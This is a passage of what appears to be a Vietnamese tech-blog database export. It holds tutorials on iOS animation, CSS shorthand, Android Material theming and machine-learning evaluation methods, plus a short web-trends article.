đưa ra quyết định của các chủ thể trên thế giới (doanh nghiệp, chính phủ,người dân).\n\n# VI. Reference\nhttp://tryqa.com/big-data-testing/\n\nhttps://www.guru99.com/big-data-testing-functional-performance.html\n\nhttps://hadoop.apache.org/\n\nhttps://en.wikipedia.org/wiki/Apache_Hadoop	I. Big Data là gì?\n\n* Big Data không chỉ đơn giản nói đến khối lượng dữ liệu lớn mà còn nói đến tốc độ dữ liệu và tính đa dạng của dữ liệu.\n* Khi chúng ta có một khối lượng dữ liệu hợp lý, chúng ta thường sử dụng các CSDL quan hệ truyền thống như Oracle, MySQL, SQL Server để lưu trữ và làm việc.\n* Tuy nhiên khi chúng ta có khối lượng data lớn sẽ không thể sử dụng các CSDL truyền thống để làm vi...	{https://images.viblo.asia/1756c6e0-d47f-4d10-a540-1120debf2b15.png,https://images.viblo.asia/40c34f3f-8b21-4741-87d0-dc3157dce669.png,https://images.viblo.asia/0b086eff-ec66-4f86-8c23-0be2406a06c0.jpg,https://images.viblo.asia/b4dec05a-db51-432b-a70b-0a8c61176ef3.png,https://images.viblo.asia/bb87a19e-5dcb-45a2-b159-18d0873dd56c.png,https://images.viblo.asia/973ba9e1-bee7-41e3-a698-d308ba0f099d.png,https://images.viblo.asia/2632efa0-4e2a-4f31-9dd3-8b49d741e33d.png,https://images.viblo.asia/e3658d69-a748-4452-8c41-ec1d3f9f2003.png,https://images.viblo.asia/8615c2f8-0024-4a7e-939c-7a63b88d48c3.png,https://images.viblo.asia/5b08d763-a57c-4063-b0c6-49e7ccc9aa21.png,https://images.viblo.asia/b0337d51-b0bc-4de2-9808-20186efb1fb5.png}	1	Big Data Testing	{big-data-testing,nosql,why-nosql}	0	f	2022-12-18 15:33:37.805+00	2022-12-18 15:33:37.805+00
32022	- Bất cứ một ứng dụng nào thì hiệu ứng cũng là một tiêu chí giúp đánh giá hay giữ chân người dùng. \n- Có nhiều cách để tạo animations trong iOS, phổ biến nhất là:\n**UIView.animate(withDuration:animations:)**\n- Bạn cũng có thể sử dụng **CABasicAnimation**\n\nTrong bài hôm nay mình sẽ giới thiệu cho các bạn về **UIViewPropertyAnimator**. Class này giúp chúng ta kiểm soát animations nhiều hơn lớp tiền nhiệm **UIView.animate**. Với nó bạn có thể làm nhiều thứ hơn như custom time, interactive, hay bạn có thể pause/stop animations trong lúc nó đang hoạt động - thứ mà rất khó với lớp tiền nhiệm của nó.\n\nNghe thì có vẻ phức tạp nhỉ, cơ mà đừng lo lắng về nó, đơn giản lắm.\n\n# Starting with UIViewPropertyAnimator\n- **UIViewPropertyAnimator** có từ iOS 10 trở đi. Nó cho phép bạn tạo animations theo phong cách hướng đối tượng. Hãy cùng xem một ví dụ về animation được tạo bởi **UIViewPropertyAnimator**\n\n![](https://images.viblo.asia/8d4b1a24-1ab6-4ba5-ba5f-501ed8976808.gif)\n\n- Để làm điều đó rất đơn giản, chỉ cần đoạn code như sau\n\n```\n// Với UIView.animate\nUIView.animate(withDuration: 0.3) {\n    view.frame = view.frame.offsetBy(dx: 100, dy: 0)\n}\n\n// Với UIViewPropertyAnimator\nlet animator = UIViewPropertyAnimator(duration:0.3, curve: .linear) {\n     view.frame = view.frame.offsetBy(dx:100, dy:0)\n }\n animator.startAnimation()\n```\n\n- Nếu bạn muốn test animations thì chỉ cần tạo file Playground và chạy đoạn code trên thôi.\n\n![](https://images.viblo.asia/1cc9e68d-1322-4231-bb4b-d552597f6eb1.png)\n\n- Nhìn thì có vẻ không có gì khác nhau nhiều, nó chỉ đơn giản là một cách mới để tạo ra animations. **UIViewPropertyAnimator** trở lên tiện hơn khi bạn muốn tương tác với animations thôi, còn tiện thế nào thì bạn đọc tiếp bên dưới nhé.\n\n# Interactive and interruptible animations\n\n- Các bạn có nhớ những gesture đơn giản như slide to unlock, swipe from bottom, swipe from top không? Đó là những ví dụ đơn giản và rất hoàn hảo trong việc tương tác và làm gián đoạn trong khi animations đang diễn ra. Bạn có thể start việc di chuyển ngón tay hay dừng tay lại hay việc thả tay ra và xử lý animations ngay tại thời điểm đó.\n- Với người tiền nhiệm của nó thì việc control các điều đó quả là thứ xa xỉ. Bạn không thể cung cấp một cách dễ dàng tỉ lệ phần trăm animations đã hoàn thành. Bạn không thể tạm dừng lại animations khi mà nó đang diễn ra. Ví dụ khi thanh progress bạn set giá trị 1.0 cho nó và thực hiện animate cho nó thì nó cứ chạy tới 1.0 mới dừng lại và bạn không có cách nào để cho nó dừng lại ở một vị trí nửa vời. Giả sử progress chạy tới 30%, bạn tap vào thì dừng lại ở vị trí đó. Thật khổ sở...\n- Nhưng với **UIViewPropertyAnimator** việc đó trở lên dễ dàng hơn rất nhiều.\n\n# Preparing the Starter Project\n- Ở đây mình chuẩn bị 1 project với 1 thanh progress view như hình dưới\n\n![](https://images.viblo.asia/bdb97cec-71ae-4605-a666-b606fac70445.png)\n\n- Mục đích của bài viết này là mình sẽ sử dụng **UIViewPropertyAnimator** để cho thanh progress kia chạy từ 0 tới 1 và có thể **dừng lại** hoặc **tiếp tục** chạy mỗi khi tap vào view của controller.\n- Nếu bạn sử dụng UIView.animate thì sẽ cực kì khó khăn, nhưng với animator này thì lại rất đơn giản.\n- Trong **ViewController.m** khai báo một số property như sau:\n```\n@property (weak, nonatomic) IBOutlet UIProgressView *progressView;\n@property (nonatomic, retain) UIViewPropertyAnimator *animator;\n@property (nonatomic, assign) BOOL isRunning;\n```\n\n- Khởi tạo một vài thứ:\n```\n- (void)viewDidLoad\n{\n    [super viewDidLoad];\n    self.isRunning = NO;\n    [self.progressView setProgress:0.f];\n    UITapGestureRecognizer *gestureRecognizer = [[UITapGestureRecognizer alloc] initWithTarget:self\n                                                                                        action:@selector(didTapView)];\n    [self.view addGestureRecognizer:gestureRecognizer];\n}\n```\n- Ở đây mình có tạo 1 gesture cho view của controller để bắt action khi bạn tap vào view đó.\n\n# Running property animator with duration\n- Công việc đầu tiên là gán lại cho thằng progress view về 0\n- Khởi tạo và start luôn cái animation sử dụng UIViewPropertyAnimator\n\n```\n- (void)viewDidAppear:(BOOL)animated\n{\n    [super viewDidAppear:animated];\n    self.isRunning = YES;\n    self.animator = [UIViewPropertyAnimator runningPropertyAnimatorWithDuration:10.f\n                                                                          delay:0.f\n                                                                        options:UIViewAnimationOptionCurveEaseInOut\n                                                                     animations:^{\n                                                                         if (self.isRunning) {\n                                                                             [self.progressView setProgress:1.0f\n                                                                                                   animated:YES];\n                                                                         } else {\n                                                                             [self.progressView setProgress:self.animator.fractionComplete\n                                                                                                   animated:YES];\n                                                                         }\n                                                                     }\n                                                                     completion:^(UIViewAnimatingPosition finalPosition) {\n\n                                                                     }];\n    [self.animator startAnimation];\n}\n```\n- Đồng thời giá trị isRunning được bắt đầu là YES \n- Ở đây mình giải thích một chút: \n    - Tổng thời gian chạy là 10s\n    - Option là dạng UIViewAnimationOptionCurveEaseInOut\n    - Trong block animations nếu đang ở trạng thái running thì cứ cho nó animate progress view tới giá trị 1. Còn ngược lại thì bạn gán nó bằng giá trị fractionComplete (đây chính là tỉ lệ % animations đã được thực hiện)\n\n# Xử lý pause/start animations\n```\n- (void)didTapView\n{\n    self.isRunning = !self.isRunning;\n    if (self.isRunning) {\n        [self.animator startAnimation];\n    } else {\n        [self.animator pauseAnimation];\n    }\n}\n```\n- Khi bạn tap vào view của controller thì cần có biến trạng thái (ở đây là isRunning) \n    - Nếu nó đang chạy thì dừng lại (pause) **pauseAnimation**\n    - Nếu đã dừng lại rồi thì start **startAnimation**\n\n- Khi start được call sau khi pause thì nó sẽ được tiếp tục từ trạng thái đã dừng trước đó.\n\n\nCuối cùng đây là kết quả:\n\n![](https://images.viblo.asia/b2646205-29e3-433e-912e-cc7e9cbc7e8e.gif)	- Bất cứ một ứng dụng nào thì hiệu ứng cũng là một tiêu chí giúp đánh giá hay giữ chân người dùng.\n- Có nhiều cách để tạo animations trong iOS, phổ biến nhất là:\nUIView.animate(withDuration:animations:)\n- Bạn cũng có thể sử dụng CABasicAnimation\n\nTrong bài hôm nay mình sẽ giới thiệu cho các bạn về UIViewPropertyAnimator. Class này giúp chúng ta kiểm soát animations nhiều hơn lớp tiền nhiệm UIVi...	{https://images.viblo.asia/8d4b1a24-1ab6-4ba5-ba5f-501ed8976808.gif,https://images.viblo.asia/1cc9e68d-1322-4231-bb4b-d552597f6eb1.png,https://images.viblo.asia/bdb97cec-71ae-4605-a666-b606fac70445.png,https://images.viblo.asia/b2646205-29e3-433e-912e-cc7e9cbc7e8e.gif}	1	Tạo animations sử dụng UIViewPropertyAnimator trong iOS	{ios,objective-c}	0	f	2022-12-18 15:33:37.818+00	2022-12-18 15:33:37.818+00
32027	Bài viết được dịch từ nguồn: [CSS Shorthand vs. Longhand – Which to Use](https://www.hongkiat.com/blog/css-shorthand-longhand-notations/)\n\nMột kiểu ra đời khi mà người ta muốn code CSS ngắn gọn hơn, còn một kiểu thì để giữ sự rõ ràng, dễ hiểu. Dù code theo kiểu nào thì cũng có mục đích cũng như ưu/nhược điểm riêng của từng kiểu.\n\nBài viết này sẽ giúp bạn hiểu hơn về 2 kiểu *shorthand* với *longhand* này để từ đó thấy được dùng kiểu nào sẽ là tốt hơn trong từng trường hợp cụ thể.\n\n![](https://images.viblo.asia/63cd8b28-0741-491d-b2df-401db0823f76.jpg)\n\n### Shorthand là gì\n\nKiểu *shorthand* đơn giản là sẽ đem gom giá trị của một số thuộc tính CSS lại với nhau. Ví dụ ta có thể gán giá trị cho `border-width`, `border-style` và  `border-color` mà chỉ cần sử dụng duy nhất thuộc tính `border` như sau:\n\n```css\nborder: 1px solid blue;\n```\n\nChắc hẳn ví dụ này cũng rất quen thuộc với bạn, code trên sẽ tương đương với:\n\n```css\nborder-width: 1px;\nborder-style: solid\nborder-color: blue;\n```\nVới cách này thì ta không phải khai báo riêng lẻ cho từng giá trị `width`, `style`, `color`, giúp tiết kiệm không gian và thời gian.\n\n#### 1. Cách thức hoạt động\n\nNhư đã đề cập ở trên, ta sẽ dùng `shorthand` để khai báo một tập hợp các giá trị của thuộc tính, thứ tự của các thuộc tính đó không quan trong, miễn nó đều là thành phần của thuộc tính bên ngoài (trong ví dụ trên là `width`, `style`, `color` của `border`). Với những thuộc tính có giá trị tương tự như `margin` thì thứ tự mới quan trọng, bạn hãy nhớ theo chiều kim đồng hồ.\n\nBây giờ, trong ví dụ trên thì sẽ ra sao nếu ta khai báo thiếu mất giá trị, giả sử là `border-style` chẳng hạn, code sẽ như này:\n\n```css\nborder: 1px blue;\n```\n\nKết quả là ta sẽ không thấy `border` hiện ra nữa, không phải khai báo `shorthand` kia không làm việc mà vì ta quên khai báo nên `border-style` đã nhận giá trị mặc định của nó là `none`. Code sẽ tương đương như sau:\n\n```css\nborder: 1px none blue;\n```\n\nBây giờ hãy bỏ `border-width` và giữ nguyên 2 thuộc tính còn lại:\n\n```css\nborder: solid blue;\n```\n\nKết quả là ta vẫn thấy `border` hiện ra nhưng với **dày** hơn `1px` một chút bởi vì `border-width` đã nhận giá trị mặc định là `medium`.\n\nĐiều này cho thấy, khi một giá trị của thuộc tính không được khai báo trong *Shorthand* thì nó sẽ nhận giá trị mặc định của mình (ngay cả khi nó phải ghi đè bất kỳ giá trị nào trước đó được gán cho cùng thuộc tính).\n\nNếu có khai báo `border-width: 1px` cho một thành phần ở đâu đó trước `border: solid blue` thì độ rộng của `border` sẽ là `medium` (mặc định) chứ không phải là `1px`.\n\nChú ý là ta sẽ không thể dùng các giá trị như `inherit`, `initial` hoặc là `unset` cho tất cả thuộc tính CSS trong *Shorthand*, vì như thế thì browser sẽ không thể nào biết được chính xác thuộc tính nào là đại diện cho *Shorthand*, cho nên tất cả khai báo sẽ bị hủy.\n\n#### 2. Thuộc tính `all`\n\nCó một *Shorthand* có thể áp dụng cho toàn bộ các thuộc tính CSS.  Các giá trị `inherit`, `initial` hay `unset` được áp dụng cho tất cả các thuộc tính và do đó đây là các giá trị duy nhất được chấp nhận bởi thuộc tính `all`.\n\n```css\ndiv {\n  all: initial\n}\n```\n\nĐiều này sẽ làm cho tất cả các thành phần `div` bỏ qua các thuộc tính CSS mà nó có và đặt lại với giá trị mặc định. Chính vì thế mà không nên lạm dụng thuộc tính `all`.\n\n**Note:** Thuộc tính `color` sẽ nhận giá trị `hexadecimal` trong *Shorthand* nếu như 2 số của giá trị `hex` trong nó là giống nhau, ví dụ `background: #445599` sẽ tương đương `background: #459`.\n\n### Longhand là gì\n\nLà các thuộc tính đơn lẻ có thể được gộp lại trong *Shorthand*, ví dụ như `background-image`, `margin-left`, `animation-duration`, ...\n\n#### Vì sao ta sử dụng Longhand\n\nSử dụng *Longhand* thì dài hơn, không tiện nhưng sao ta vẫn cần sử dụng? Như đề cập ở phần trên, *Shorthand* sẽ ghi đè các thuộc tính bị bỏ sót với giá trị mặc định của nó, đây sẽ là vấn đề nếu như việc ghi đè đó là không cần thiết.\n\nHãy lấy ví dụ khai báo `font` bên dưới để làm ví dụ, sử dụng nó trong thành phần `h4` (được in đậm với mặc định `font-weight:bold`):\n\n```css\nfont: 20px "courier new";\n```\n\nTrong *Shorthand* này, thuộc tính `font-weight` không được khai báo nên nó sẽ nhận giá trị mặc định là `font-weight:normal` nên thẻ `h4` kia sẽ mất **in đậm**.\n\nVới ví dụ trên thì khai báo 2 thuộc tính *Longhand* là `font-size` và `font-family` sẽ tốt hơn. Và khai báo *Shorthand* cho một vài thuộc tính thì cũng không có nhiều ý nghĩa.\n\nTrong giai đoạn phát triển, một số dev (đặc biệt là newbie) có thể thấy việc sử dụng *Longhand* sẽ dễ dàng hơn rất nhiều so với *Shorthand* vì nó dễ đọc và rõ ràng hơn.\n\n***\n### Tham khảo\n- https://www.hongkiat.com/blog/css-shorthand-longhand-notations/\n\n\n***\nCám ơn vì đã theo dõi bài viết, hi vọng sẽ có ích với bạn.	Bài viết được dịch từ nguồn: CSS Shorthand vs. Longhand – Which to Use\n\nMột kiểu ra đời khi mà người ta muốn code CSS ngắn gọn hơn, còn một kiểu thì để giữ sự rõ ràng, dễ hiểu. Dù code theo kiểu nào thì cũng có mục đích cũng như ưu/nhược điểm riêng của từng kiểu.\n\nBài viết này sẽ giúp bạn hiểu hơn về 2 kiểu shorthand với longhand này để từ đó thấy được dùng kiểu nào sẽ là tốt hơn trong từng trư...	{https://images.viblo.asia/63cd8b28-0741-491d-b2df-401db0823f76.jpg}	1	CSS Shorthand và Longhand	{css}	0	f	2022-12-18 15:33:37.822+00	2022-12-18 15:33:37.822+00
31869	## Các thuộc tính và kiểu của Widget\nMặc dù các thuộc tính global của theme đáp ứng phần lớn nhu cầu của chúng ta, nhưng đôi khi chúng ta có thể muốn tùy chỉnh các thuộc tính của các \bwidget riêng lẻ. Chúng ta sẽ khám phá các kiểu (và các thuộc tính có liên quan) của các widget phổ biến và cách chúng có thể được tham chiếu trong Material Components theme của bạn.\n\n### Buttons\nCác Material Button bao gồm bốn biến thể chính mà tất cả đều kế thừa từ kiểu Widget.MaterialComponents.Button cơ bản, mỗi biến thể có một hậu tố kiểu tùy chọn: **raised** (default, no suffix), **unelevated** (`.UnelevatedButton`), **outlined** (`.OutlinedButton`) và **text** (`.TextButton`). Tất cả các biến thể button sử dụng thuộc tính chủ đề textAppparentButton cho kiểu chữ của chúng.\n\nCác thuộc tính chính để tùy chỉnh các kiểu này bao gồm:\n* `backgroundTint`: Màu tint được áp dụng cho background của button. Màu được dùng mặc định là trong suốt đối với các text button và màu `colorPrimary` cho tất cả các biến thể khác.\n* `iconTint`: Màu tint được áp dụng cho button icon tùy chọn. Màu được dùng mặc định là `colorPrimary` cho các text button và `colorOnPrimary` cho tất cả các biến thể khác.\n* `rippleColor`: Màu ripple của button khi có hành động chạm. Màu mặc định là `colorOnPrimary` cho các raised/unelevated button và `colorPrimary` cho các outlined/text button.\n* `strokeColor`: Màu của stroke xung quanh button background. Màu mặc định là `colorOnSurface` cho các outlined button và trong suốt cho tất cả các biến thể khác.\n* `strokeWidth`: Chiều rộng của stroke xung quanh button background. Giá trị mặc định là 1dp cho các outlined button và 0dp cho tất cả các biến thể khác.\n* `shapeAppearance`: Hình dạng xuất hiện của button background. Giá trị mặc định là `shapeAppparentSmallComponent`.\n\nKiểu nút cơ sở (được sử dụng bởi lớp widget `MaterialButton`) có thể được tùy chỉnh và áp dụng trên toàn cầu như sau:\n```\n<style name="AppTheme" parent="Theme.MaterialComponents.Light">\n    ...\n    <\nitem name="materialButtonStyle">@style/AppButton</item>\n</\nstyle>\n<style name="AppButton" parent="Widget.MaterialComponents.Button">\n    <\nitem name="backgroundTint">?attr/colorSecondary</item>\n</\nstyle>\n```\n\nKết quả có thể được quan sát trong màn hình sau:\n![](https://images.viblo.asia/8228bd75-0006-4a58-ac07-23ad2dc7ade7.png)\n\n### Text Fields\nMaterial Text Fields bao gồm hai biến thể chính. Kết quả của việc chuyển các lớp từ `AppCompat` là `TextInputLayout` và `TextInputEditText` đã có từ trước, trên thực tế có hai kiểu cơ sở: `Widget.MaterialComponents.TextInputLayout.*` và` Widget.MaterialComponents.TextInputEditText.*`. Các biến thể có kiểu hậu tố và bao gồm **filled box** (default, `.FilledBox`) và **outlined box** (`.OutlinedBox`). Tất cả các biến thể của trường văn bản đều sử dụng giao diện văn bản tiêu chuẩn cho đầu vào và thuộc tính chủ đề `textAppearanceCaption` cho “helper” text (labels, errors, counters,...).\n\nCác thuộc tính chính để tùy chỉnh các kiểu `Widget.MaterialComponents.TextInputLayout` bao gồm:\n* `boxBackgroundMode`: Chế độ của box background, có thể là `filled`, `outline` hoặc `none`.\n* `boxBackgroundColor`: Màu của text field background. Màu được bật mặc định là `colorOnSurface` cho các trường văn bản filled box và trong suốt cho các trường văn bản outlined box.\n* `boxStrokeColor`: Màu của stroke xung quanh text field background. Màu mặc định là `colorOnSurface` (ở trạng thái mặc định) cho các trường văn bản outlined box và bị bỏ qua cho các trường văn bản filled box.\n* `hintTextColor`/`errorTextColor`/`counterTextColor`: Nhiều màu khác nhau cho các thành phần phụ khác nhau của “helper” text.\n* `shapeAppearance`: Hình dạng xuất hiện của text field background. Giá trị mặc định là `shapeAppearanceSmallComponent`.\n\nKiểu text field cơ sở (được sử dụng bởi lớp widget `TextInputLayout`) có thể được tùy chỉnh và áp dụng trên toàn cầu như sau:\n```\n<style name="AppTheme" parent="Theme.MaterialComponents.Light">\n    ...\n    <\nitem name="textInputStyle">@style/AppTextField</item>\n</\nstyle>\n<style name="AppTextField" parent="Widget.MaterialComponents.TextInputLayout.FilledBox">\n    \n<item name="boxBackgroundColor">@color/text_field_background</item>\n<\n/style>\n```\n\nKết quả có thể được quan sát trong màn hình sau:\n![](https://images.viblo.asia/ba2ef091-3638-4494-8244-74a8e109c324.png)\n\n### Cards\nMaterial Cards được coi là “surfaces” sử dụng kiểu `Widget.MaterialComponents.CardView`. Các thuộc tính chính để tùy chỉnh chúng như sau:\n* `cardBackgroundColor`: Màu của card background. Màu mặc định là `colorSurface`.\n* `cardElevation`: Độ cao của card. Giá trị mặc định là `1dp`.\n* `shapeAppearance`: Hình dạng xuất hiện của card background. Giá trị mặc định là `shapeAppearanceMediumComponent`.\n\nKiểu card cơ sở (được sử dụng bởi lớp widget MaterialCardView) có thể được tùy chỉnh và áp dụng trên toàn cầu như sau:\n```\n<style name="AppTheme" parent="Theme.MaterialComponents.Light">\n    ...\n    <\nitem name="materialCardViewStyle">@style/AppCard</item>\n</\nstyle>\n<style name="AppCard" parent="Widget.MaterialComponents.CardView">\n    <\nitem name="cardElevation">8dp</item>\n</\nstyle>\n```\n\nKết quả có thể được quan sát trong màn hình sau:\n![](https://images.viblo.asia/5c1f1743-7f3f-443a-bb79-256114210f8d.png)\n\n### Bottom Navigation\nMaterial Bottom Navigation bao gồm hai biến thể chính kế thừa từ kiểu cơ sở `Widget.MaterialComponents.BottomNavigationView`, với hậu tố kiểu tùy chọn: **surface** (default, no suffix) và **colored** (`.Colored`). Các nhãn Bottom Navigation sử dụng thuộc tính chủ đề `textAppearanceCaption` cho các kiểu chữ.\n\nCác thuộc tính chính để tùy chỉnh các kiểu này như sau:\n* `backgroundTint`: Màu của bottom navigation background. Màu mặc định là `colorSurface` cho surface bottom navigation và `colorPrimary` cho colored bottom navigation.\n* `itemTextColor`/`itemIconTint`: Màu sắc các icon và label của item thuộc bottom navigation. Các màu mặc định là `colorOnSurface`/`colorPrimary`(selected) cho surface bottom navigation và `colorOnPrimary` cho colored bottom navigation.\n* `itemHorizontalTranslationEnabled`: Một cờ để đặt có hay không một translation animation sẽ xảy ra khi chọn các item của bottom navigation. Giá trị mặc định là false.\n\n```\n<style name="AppTheme" parent="Theme.MaterialComponents.Light">\n    ...\n    <\nitem name="bottomNavigationStyle">@style/AppBottomNavigation</item>\n</\nstyle>\n<style name="AppBottomNavigation" parent="Widget.MaterialComponents.BottomNavigation.Colored" />\n```\n\nKết quả có thể được quan sát trong màn hình sau:\n![](https://images.viblo.asia/c1bf43df-d99f-4fdd-83bc-5f797d572e5c.png)\n\n## Kết luận\nNhững thành phần trên chắc chắn không đầy đủ. Một danh sách toàn diện hơn về tất cả các thành phần và thuộc tính của chúng có thể được tìm thấy trong [tài liệu Material Components](https://github.com/material-components/material-components-android/tree/master/docs/components).\n\nTham khảo: https://medium.com/over-engineering/setting-up-a-material-components-theme-for-android-fbf7774da739	Các thuộc tính và kiểu của Widget\nMặc dù các thuộc tính global của theme đáp ứng phần lớn nhu cầu của chúng ta, nhưng đôi khi chúng ta có thể muốn tùy chỉnh các thuộc tính của các \bwidget riêng lẻ. Chúng ta sẽ khám phá các kiểu (và các thuộc tính có liên quan) của các widget phổ biến và cách chúng có thể được tham chiếu trong Material Components theme của bạn.\n\nButtons\nCác Material Button bao g...	{https://images.viblo.asia/8228bd75-0006-4a58-ac07-23ad2dc7ade7.png,https://images.viblo.asia/ba2ef091-3638-4494-8244-74a8e109c324.png,https://images.viblo.asia/5c1f1743-7f3f-443a-bb79-256114210f8d.png,https://images.viblo.asia/c1bf43df-d99f-4fdd-83bc-5f797d572e5c.png}	1	Thiết lập theme Material Component cho Android (Phần 2)	{google-material-design,android}	0	f	2022-12-18 15:33:38.487+00	2022-12-18 15:33:38.487+00
31868	![](https://images.viblo.asia/7a633838-9d0a-40d5-8f35-344d71e5e532.png)\nIt is imperative to realize that the greater part of these new web applications development patterns have moved past the primary influx of appropriation and are rising to be progressively complex and dependable. Web engineers and architects have an energizing chance – they can push their customers to dependably look forward by grasping the most recent that innovation brings to the table.\n\n[**Top Web Application Development Trends**](https://www.decipherzone.com/blog-detail/Latest-Web-Application-Development-Trends)\nWeb application development is turning out to be a standout amongst the most energizing a long time for web application designers because of all the mind-boggling progressions. We are unquestionably anticipating playing with all these new toys that are accessible to us and make some superb items. So, here are our best latest web application development trends.\n\n**Web application development trends**\n\n**Machine Learning & Artificial Intelligence**\nUp until now, we have seen AI and AI be this grimy activity that takes enormous informational collections and follows upon them to give the examination. Be that as it may, with the coming of Javascript-based AI libraries, for example, brain.js and Google's Tensorflow.js, calculator figuring out how to your web application is getting to be as simple as bringing in a Javascript library. Add to these the other promptly accessible contributions, for example, ML Kit and Firebase expectations, web engineers can now genuinely consider utilizing the intensity of AI to upgrade the client experience their web application conveys.\n\n**Serverless Web Application Development**\nFacilitating suppliers like Google, Amazon and Microsoft are continually battling about the piece of the overall industry, and their attention on serverless recounts to a story. AWS Lambda and Google Firebase are two phenomenal instances of how serverless structures will enable engineers to concentrate on composing code and not stress overturning up, conveying, checking, keeping up and scaling servers. These administrations have awesome highlights that can deal with each possible use-case. Basically, connect your application to the organization of decision's serverless contributions and send your application with only a couple of snaps. Everything is upgraded for you dependent on the sort of information you are serving, regardless of whether you have an application that is perused overwhelming on the database side, or an application that stores and serves a ton of pictures, the hidden design will guarantee speed, versatility and reasonableness by using the most ideally equipped assets for the activity.	![](https://images.viblo.asia/7a633838-9d0a-40d5-8f35-344d71e5e532.png)\n\n\nIt is imperative to realize that the greater part of these new web applications development patterns have moved past the primary influx of appropriation and are rising to be progressively complex and dependable. Web engineers and architects have an energizing chance – they can push their customers to dependably look forward by grasping the most recent that innovation brings to the table.\n\nTop ...	{https://images.viblo.asia/7a633838-9d0a-40d5-8f35-344d71e5e532.png}	1	Latest Web Application Development Trends	{agile-software-development,sharpweb,artificial-intelligence}	0	f	2022-12-18 15:33:38.508+00	2022-12-18 15:33:38.508+00
31856	## **Tập dữ liệu dùng để học máy:**\n* \tTập huấn luyện: Được dùng để huấn luyện hệ thống.\n* \tTập tối ưu: Tùy chọn và được dùng để tối ưu các tham số của hệ thống.\n* \tTập kiểm thử: Được dùng để đánh gúa hệ thống đã được huấn luyện. \n\n=> Tập huấn luyện càng lớn(*) thì hiệu năng của hệ thống học càng tốt. <br>\n=> Tập kiểm thử càng lớn thì việc đánh giá càng chính xác. <br>\n*Rất khó (ít khi) có thể có được các tập dữ liệu (rất) lớn.*\n## Hiệu năng của hệ thống không chỉ phụ thuộc vào giải thuật học máy mà còn phụ thuộc:\n* \tClass distribution (phân bố lớp)\n* \tCost of misclassification\n* \tSize of the training set (kích thước của tập huấn luyện)\n* \tSize of the testing set (kích thước tập kiểm thử)\n## Các phương pháp đánh giá hiệu năng học máy:\n* \tHold-out\n* \tStratified sampling\n* \tRepeated hold-out\n* \tCross validation (k-fold, leave-one-out) \n* \tBootstrap sampling\n### 1. Hold-out\nToàn bộ tập dữ liệu (*data*) sẽ được chia thành 2 tập con *datatrain* và *datatest* không giao nhau (|*datatrain*| >>|*datatest*|).<br>\n* \tTập huấn luyện *datatrain*: để huấn luyện hệ thống\n* \tTập kiểm thử *datatest*: để đánh giá hiệu năng của hệ thống sau khi đã được huấn luyện\nYêu cầu:\n* \tDữ liệu thuộc tập kiểm thử *datatest* không được sử dụng trong quá trình huấn luyện hệ thống.\n* \tDữ liệu thuộc tập huấn luyện *datatrain* không được sử dụng trong quá trình đánh giá hệ thống sau khi huấn luyện.<br>\nVí dụ: Ta có thể chọn |*datatrain*| = (2/3).|*data*| và |*data test* | = (1/3).|*data*|<br>\n\n=> Cách đánh giá này phù hợp khi ta bộ dữ liệu (*data*) có kích thước lớn.\n### 2. Stratified sampling\nĐược sử dụng khi các tập ví dụ có kích thước nhỏ hoặc không cân xứng (unbalanced datasets).<br>\nVí dụ: có ít, hoặc không có các ví dụ với một số lớp<br>\nMục tiêu: Phân bố lớp (Class distribution) trong tập huấn luyện và tập kiểm thử phải xấp xỉ như trong tập toàn bộ các ví dụ (*data*)<br>\n* \tStratified sampling là một phương pháp để cân xứng về phân bố lớp\n* \tĐảm bảo tỉ lệ phân bố lớp trong tập huấn luyện và tập kiểm thử sẽ là xấp xỉ nhau\n\n=> Phương pháp này không áp dụng được cho bài toán học máy dự đoán/hồi quy (vì giá trị đầu ra của hệ thống là một giá trị số, không phải là một nhãn lớp)\n### 3. Repeated hold-out\nĐây là phương pháp sẽ áp dụng phương pháp đánh giá Hold-out nhiều lần, để sinh ra các tập huấn luyện và thử nghiệm khác nhau. <br>\nTrong mỗi lần lặp, một tỉ lệ nhất định của tập dữ liệu (*data*) được chọn ngẫu nhiên nhằm tạo nên tập huấn luyện (có thể kết hợp với phương pháp Stratified sampling).<br>\nĐối với các giá trị lỗi (hoặc giá trị với các tiêu chí đánh giá khác) ghi nhận trong các bước lặp này được lấy trung bình công để xác định lỗi tổng thể.\n\n=> Tuy nhiên phương pháp này chưa được tốt vì\n* \tMỗi bước lặp ta lại có một tập kiểm thử khác nhau\n* \tCó một số dữ liệu sẽ được dùng nhiều lần (trùng lặp) trong các tập kiểm thử\n### 4. Cross validation\n**4.1. k-fold**\n* \tTập dữ liệu (*data*) được chia thành k tập con không giao nhau (gọi là “fold”) có kích thước xấp xỉ nhau.\n* \tMỗi lần lặp, một tập con trong *k* tập sẽ được dùng để làm tập kiểm thử, *(k-1)* tập còn lại sẽ được sử dụng làm tập huấn luyện.\n* \t*k* giá trị lỗi (mỗi giá trị tương ứng với mỗi “fold”) sẽ được tính trung bình cộng để thu được giá trị lỗi tổng thể.<br>\nVí dụ: ta có thể chia data thành 10 hoặc 5 folds *(k = 10 hoặc k = 5)*<br>\n\nThông thường mỗi tập con (fold) được lấy mẫu phân tầng (xấp xỉ phân bố lớp) trước khi áp dụng quá trình đánh giá Cross validation<br>\n=> Phù hợp khi ta có tập dữ liệu *data* vừa và nhỏ.\n\n**4.2. leave-one-out**\n* \tSố lượng các nhóm folds bằng kích thước của tập dữ liệu *(k = |data|)*\n* \tMỗi nhóm fold chỉ bao gồm 1 ví dụ\n* \tKhai thác tối đa tập dữ liệu ban đầu\n* \tKhông có bước lấy mẫu ngẫu nhiên\n* \tChi phí tính toán cao\n=> Phù hợp khi ta có tập dữ liệu data (rất) nhỏ.\n### 5. Bootstrap sampling\nPhương pháp này sử dụng việc lấy mẫu lặp lại để tạo nên tập huấn luyện.\t\n* \tGiả sử toàn bộ tập *data* bao gồm *n* ví dụ\n* \tLấy mẫu có lặp lại *n* lần đối với tập *data* để tạo nên tập huấn luyện *datatrain* gồm *n* ví dụ:\n    * \tTừ tập *data*, lấy ngẫu nhiên một ví dụ *x* (nhưng không loại bỏ *x* khỏi *data*)\n    * \tĐưa dữ liệu *x* vào trong tập huấn luyện\n    * \tLặp lại các bước trên *n* lần, ta có *n* dữ liệu trong tập *datatrain*<br>\n=> Sử dụng dữ liệu tập *datatrain* để huấn luyện hệ thống.<br>\n=> Sử dụng tất cả các dữ liệu thuộc *data* nhưng không thuộc tập huấn luyện (*datatrain*) để tạo nên tập test.\n* \tXác suất để 1 ví dụ không được chọn vào tập huấn luyện là (1-1/n).\n* \tXác suất để một ví dụ (sau khi lấy mẫu lặp lại – bootstrap sampling) được đưa vào tập kiểm thử là: (1-1/n)^n \n=> Phù 